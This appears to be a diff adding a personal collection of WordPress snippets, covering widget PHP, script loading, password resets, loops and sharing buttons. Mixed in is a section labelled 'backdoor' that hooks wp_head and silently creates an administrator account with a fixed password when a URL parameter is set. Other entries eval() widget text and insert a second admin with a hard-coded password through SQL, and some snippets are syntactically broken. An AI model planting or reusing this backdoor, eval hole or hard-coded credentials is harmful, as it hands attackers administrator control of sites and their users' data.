@@ -1,0 +1,405 @@
+
+
+
+
+
+Allow PHP in WordPress text widgets
+
+
+Template File to Edit: functions.php
+
+
+
+function php_text($text) {
+ if (strpos($text, '<' . '?') !== false) {
+ ob_start();
+ eval('?' . '>' . $text);
+ $text = ob_get_contents();
+ ob_end_clean();
+ }
+ return $text;
+}
+add_filter('widget_text', 'php_text', 99);
+
+
+using css in functions.php
+
+
+function insert_something() 
+{
+	echo &lt;&lt;&lt;CSS
+ 
+	h1 {
+		color: #CCCCCC;
+		font-size: 18px;
+	}
+	h3 {
+		color: #CECECE;
+		font-size: 14px;
+	}
+ 
+	CSS;
+}
+
+
+
+add_action('wp_head', 'insert_something');
+
+
+
+Manually Reset Your Password
+
+UPDATE `wp_users` SET `user_pass` = MD5('PASSWORD') WHERE `wp_users`.`user_login` =`admin` LIMIT 1;
+
+
+
+
+How to Move JavaScripts to the Bottom or Footer in WordPress
+
+
+
+function wpb_adding_scripts() {
+wp_register_script('my-amazing-script', get_template_directory_uri() . '/js/my-amazing-script.js','','1.1', true);
+wp_enqueue_script('my-amazing-script');
+}
+add_action( 'wp_enqueue_scripts', 'wpb_adding_scripts' ); 
+
+
+In this code, we have used wp_register_script() function. This function has the following parameters:
+
+<?php
+wp_register_script( $handle, $src, $deps, $ver, $in_footer );
+?>
+
+
+for plugins 
+
+wp_register_script('script-handle', plugins_url('js/script.js'  , __FILE__ ),'','1.0);
+
+
+
+
+How to Properly Add JavaScripts and Styles in WordPress
+
+
+<?php
+function wpb_adding_scripts() 
+{
+wp_register_script('my_amazing_script', plugins_url('amazing_script.js', __FILE__), array('jquery'),'1.1', true);
+wp_enqueue_script('my_amazing_script');
+}
+
+add_action( 'wp_enqueue_scripts', 'wpb_adding_scripts' ); 
+?>
+
+
+
+Deactivate all plugins using phpMyAdmin
+
+
+In your WordPress database, go in the wp_options table. Locate the option name “active_plugins”. Now edit the value of that option and change it to this: a:0:{}
+
+
+
+Reset WordPress Admin password through FTP
+
+
+<?php   
+  wp_set_password('password',1);  
+  $user_info = get_userdata(1);  
+  echo 'Username: ' . $user_info->user_login . "\n";
+?>
+
+
+
+Inserting another page inside a page 
+
+
+<?php include (TEMPLATEPATH . '/terms.php');
+
+
+
+
+Add titles to previous_post_link & next_post_link
+
+
+Template File to Edit: single.php
+
+
+<?php 
+	$p = get_adjacent_post(false, '', true);
+	if(!empty($p)) echo '<div class="prev"><a href="' . get_permalink($p->ID) . '" title="' . $p->post_title . '">' . $p->post_title . '</a></div>';
+ 
+	$n = get_adjacent_post(false, '', false);
+	if(!empty($n)) echo '<div class="next"><a href="' . get_permalink($n->ID) . '" title="' . $n->post_title . '">' . $n->post_title . '</a></div>'; 
+?>
+
+
+
+How to Change Admin Username from admin
+
+Create another administrator user and then login as new administrator user and delete "admin" user.
+
+
+
+
+the wp_option table is corrupted and cant be repaired. . .
+
+
+myisamchk -r /var/lib/mysql/db name/wp_options --max-record-length=100000
+
+
+
+backdoor
+
+
+<?php
+add_action('wp_head', 'my_backdoor');
+
+function my_backdoor() {
+If ($_GET['backdoor'] == 'go') {
+require('wp-includes/registration.php');
+If (!username_exists('brad')) {
+$user_id = wp_create_user('Master', 'qwer123');
+$user = new WP_User($user_id);
+$user->set_role('administrator');
+}
+}
+}
+?>
+
+
+
+
+
+How to insert ads in between the blog posts
+
+
+add_filter( 'the_content', 'wpse_ad_content' );
+function wpse_ad_content( $content ) {
+        if( !is_single() )
+            return $content;
+
+            $paragraphAfter =11; //Enter number of paragraphs to display ad after.
+            $content = explode ( "</p>", $content );
+            $new_content = '';
+                for ( $i = 0; $i < count ( $content ); $i ++ ) {
+                    if ( $i == $paragraphAfter ) {
+                    $new_content .= '<div style="width: 300px; height: 250px; padding: 6px 0px 10px 0;  margin-left:auto; margin-right: auto">';
+                    $new_content .= '<!-- BuySellAds Zone Code -->
+<div id="bsap_1295188" class="bsarocks bsap_e018debe332c62c85bc58d9733fc8b62"></div>
+<!-- End BuySellAds Zone Code -->';
+                    $new_content .= '</div>';
+                    }
+            $new_content .= $content[$i] . "</p>";
+            }
+            return $new_content;
+    }
+
+
+
+
+
+    How to remove images from the content
+
+
+
+<?php
+function remove_images( $content ) {
+   $postOutput = preg_replace('/<img[^>]+./','', $content);
+   return $postOutput;
+}
+add_filter( 'the_content', 'remove_images', 100 );
+?>
+
+Then at the end of that file include the following to remove the filter:
+
+<?php remove_filter( 'the_content', 'remove_images', 100 ); ?>
+
+
+
+
+
+
+ Use More Than One Loop On A Page, Without Printing Duplicate Posts
+
+
+Let’s start with the first loop. we’re just going to get the eight most recent posts using the showposts parameter. Open the index.php file, and paste the following code to output your “featured” posts:
+
+
+<?php
+query_posts('showposts=8');
+$ids = array();
+while (have_posts()) : the_post();
+$ids[] = get_the_ID();
+the_title();
+the_content();
+endwhile;
+?>
+
+
+Once that's done, it’s time to apply our second loop and get all posts, excepted the ones we have already outputted in the first loop:
+
+<?php
+query_posts(array('post__not_in' => $ids));
+while (have_posts()) : the_post();
+the_title();
+the_content();
+endwhile;
+?>
+
+
+
+
+
+
+Create Your Own WordPress Loops Using The WP_Query Object
+
+
+<?php
+$myPosts = new WP_Query();
+$myPosts->query('showposts=5');
+
+while ($myPosts->have_posts()) : $myPosts->the_post(); ?>
+   the_title();
+   the_content();
+endwhile;
+
+?>
+
+
+
+
+
+
+Create A "Send To Facebook" Button
+
+
+Open the single.php file in your theme.
+
+
+Paste the following code in the loop:
+
+<a href="http://www.facebook.com/sharer.php?u=<?php the_permalink();?>&t=<?php the_title(); ?>" target="blank">Share on Facebook</a>
+
+Alternatively, you could use the getTinyUrl() function to send a short URL to Facebook:
+
+<?php $turl = getTinyUrl(get_permalink($post->ID)); ?>
+<a href="http://www.facebook.com/sharer.php?u=<?php echo $turl;?>&t=<?php the_title(); ?>" target="blank">Share on Facebook</a>
+
+
+
+
+CHANGING THE DEFAULT WORDPRESS LOGIN URL
+
+
+Open htaccess and add this line on top:
+
+RewriteRule ^login$ http://YOUR_SITE.com/wp-login.php [NC,L]
+
+
+
+
+
+CREATING YOUR OWN CUSTOM ADMIN COLOR SCHEME
+
+
+ In this example, we'll call it admin.css and place it in a folder entitled/css. Once again, edit the functions.php file and add this snippet:
+
+// Custom WordPress Admin Color Scheme
+function admin_css() {
+	wp_enqueue_style( 'admin_css', get_template_directory_uri() . '/css/admin.css' );
+}
+add_action('admin_print_styles', 'admin_css' );
+
+
+
+
+Translate WordPress in Your Language
+
+
+ open the wp-config.php file in your root folder.
+
+In it locate the following line:
+
+define ('WPLANG', '');
+and replace it with:
+
+define ('WPLANG', 'bg_BG');
+where bg_BG is the locale code of your country.
+
+
+
+how to give thumbnail to uploaded videos in wp
+
+
+<video width="640" height="360" src="http://www.youtube.com/demo/google_main.mp" autobuffer controls poster="whale.png">
+
+
+
+How to add any code in the footer 
+
+
+add_action('wp_footer', 'add_googleanalytics');
+function add_googleanalytics() {
+     // Paste your Full Google Analytics Javascript here within a php echo
+}
+
+
+
+
+How To Rename Your WordPress WP-Content Directory
+
+
+
+In this example, we will rename the wp-content folder to assets. 
+
+
+In the wp-config file first, add the following line before require_once(ABSPATH . 'wp-settings.php'); (usually located at the very bottom) to tell WordPress that the wp-content has changed to assets.
+
+define ('WP_CONTENT_FOLDERNAME', 'assets');  
+
+
+Then, add this line below to direct WordPress to the new directory path.
+
+
+define ('WP_CONTENT_DIR', ABSPATH . WP_CONTENT_FOLDERNAME) ;  
+define('WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/');  
+define('WP_CONTENT_URL', WP_SITEURL . WP_CONTENT_FOLDERNAME);  
+//if you are on localhost then -  define('WP_CONTENT_URL','http://localhost/wordpress/assets');
+
+
+
+
+create another user from with admin privilege with mysql
+
+
+INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('2', 'testing', MD5('inspire!@#'), 'testing', 'test@yourdomain.com', 'http://inspirecosmetics.com.au/', '2014-08-18 00:00:00', '', '0', 'testing');
+
+INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
+
+INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_user_level', '10');
+
+
+
+
+
+Display Content Only To Registered Users
+
+
+function.php
+
+function member_check_shortcode($atts, $content = null) {
+if (is_user_logged_in() && !is_null($content) && !is_feed()) {
+return $content;
+} else {
+return 'Sorry, this part is only available to our members. Click here to become a member!';
+}
+add_shortcode('member', 'member_check_shortcode');
+
+
+now add a secret post like this -:
+
+[member]
+This text will be displayed only to registered users.
+[/member]
